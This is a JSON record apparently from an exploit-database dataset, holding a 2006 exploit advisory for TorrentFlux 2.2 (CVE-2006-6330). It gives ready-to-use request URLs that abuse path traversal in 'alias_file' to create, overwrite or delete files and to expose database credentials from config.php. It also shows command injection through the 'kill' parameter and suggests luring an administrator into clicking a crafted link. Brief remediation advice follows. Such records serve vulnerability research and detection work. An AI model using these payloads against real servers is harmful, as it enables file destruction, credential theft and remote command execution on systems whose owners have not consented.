{
  "id": "2786",
  "title": "torrentflux 2.2 - Arbitrary File Create/ Execute/Delete",
  "cve": "CVE-2006-6330",
  "vuln_type": "path_traversal",
  "code": "#################################################################################################\r\n#                                                                                               #\r\n#                                    r0ut3r Presents...                                         #\r\n#                                                                                               #\r\n#                                Another r0ut3r discovery!                                      #\r\n#                                                                                               #\r\n# TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablities #\r\n#                                                                                               #\r\n#################################################################################################\r\n#                                                                                               #\r\n# Software: TorrentFlux 2.2                                                                     #\r\n#                                                                                               #\r\n# Vendor: http://www.torrentflux.com/                                                           #\r\n#                                                                                               #\r\n# Released: 2006/11/15                                                                          #\r\n#                                                                                               #\r\n# Discovered By: r0ut3r (writ3r [at] gmail.com)                                                 #\r\n#                                                                                               #\r\n# Criticality: Highly critical                                                                  #\r\n#                                                                                               #\r\n# Note: The information provided in this document is for TorrentFlux administrator              #\r\n# testing purposes only!                                                                        #\r\n#                                                                                               #\r\n# \"TorrentFlux 2.2Beta does not seem to be vulnerable\"                                          #\r\n#################################################################################################\r\n\r\n   TorrentFlux 2.2 Arbitrary File Creation/Overwrite/Deletion & Command Execution Vulnerablity\r\n-------------------------------------------------------------------------------------------------\r\n\r\nalias_file = name of file you want to create.\r\ndelfile = name of file you want to remove\r\n\r\n-= To overwrite a file (make sure q.php is there, provided thats the file you want to overwrite): =-\r\n/torrentflux/index.php?alias_file=../../q.php&kill=3361&kill_torrent= q.torrent\r\n\r\n-= To create a file: =-\r\n/torrentflux/index.php?alias_file=q.php&kill=3361&kill_torrent=q.torrent\r\n\r\nAll files are filled with:\r\n0\r\n0\r\nTorrent Stopped\r\n\r\n-= Exploit on config.php =-\r\n/torrentflux/index.php?alias_file=../../config.php&kill=3361&kill_torrent=q.torrent\r\nIt will redirect you to index.php and it will display the DATABASE USERNAME/PASSWORD IN PLAINTEXT, plus the rest of the config information!\r\n\r\nindex.php displays:\r\n0 -100 Torrent Stopped * TorrentFlux PHP Torrent Manager * www.torrentflux.com\r\n\r\n**************************************************************/ /* This file is part of TorrentFlux. TorrentFlux is free software; you can\r\n\r\nredistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation; either\r\n\r\n...etc...\r\n\r\n**************************************************************************/ // YOUR DATABASE CONNECTION INFORMATION\r\n\r\n/**************************************************************************/ // Check the adodb/drivers/ directory for support for your\r\n\r\ndatabase // you may choose from many (mysql is the default) $cfg[\"db_type\"] = \"mysql\"; // mysql, postgres7 view adodb/drivers/\r\n\r\n$cfg[\"db_host\"] = \"localhost\"; // DB host computer name or IP $cfg[\"db_name\"] = \"tf\"; // Name of the Database $cfg[\"db_user\"] = \"root\"; //\r\n\r\nusername for your MySQL database $cfg[\"db_pass\"] = \"owned\"; // password for database\r\n\r\n-= Files can also be deleted like so: =-\r\n/torrentflux/index.php?alias_file=owned.php&kill=3361&delfile=owned.php\r\n\r\n-= Command Execution Exploit =-\r\n/torrentflux/index.php?alias_file=owned.php&kill= ; echo \"r0ut3r's TorrentFlux 0day\" > /tmp/q.php&kill_torrent=q.torrent&return=true\r\n\r\nReplace kill parameter like so:\r\nkill=; your command\r\nkill=; echo \"r0ut3r just owned your system! hacked!\" > /tmp/read_this.php\r\n\r\nThe only draw back is that you have to be a registered member before you can access the functions of index.php.\r\nAlternatively you could direct the administrator to a link which overwrites the config.php file, then catch the output on index.php somehow (be quick).\r\n\r\nSolution:\r\n----------\r\nSanitize all variables listed above and below.\r\nalias_file\r\ndelfile\r\nkill\r\nkill_torrent\r\n\r\nSolution 2:\r\n-----------\r\nSet up .htaccess and only allow certain people to login until an offical patch is released.\r\n\r\n----------------------------------------------------------------------------------------------\r\n              This has been another r0ut3r discovery (writ3r [ at ] gmail.com)\r\n----------------------------------------------------------------------------------------------\r\n\r\n# milw0rm.com [2006-11-15]",
  "url": "https://www.exploit-db.com/exploits/2786"
}